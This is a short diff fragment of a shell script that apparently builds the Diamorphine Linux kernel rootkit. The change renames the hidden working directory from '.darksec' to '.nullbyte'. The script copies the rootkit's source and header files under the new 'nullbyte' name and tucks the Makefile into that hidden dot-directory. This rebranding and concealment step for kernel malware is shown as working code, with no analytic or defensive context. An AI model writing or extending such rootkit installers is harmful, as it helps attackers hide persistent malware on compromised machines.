@@ -9,7 +9,7 @@ KERNEL=$(cat /proc/version | cut -d ' ' -f3)
 MAKE() {
 
     cd Diamorphine && \
-    mkdir .darksec && \
+    mkdir .nullbyte && \
     cp diamorphine.c nullbyte.c && \
     cp diamorphine.h nullbyte.h && \
     mv Makefile .nullbyte && \
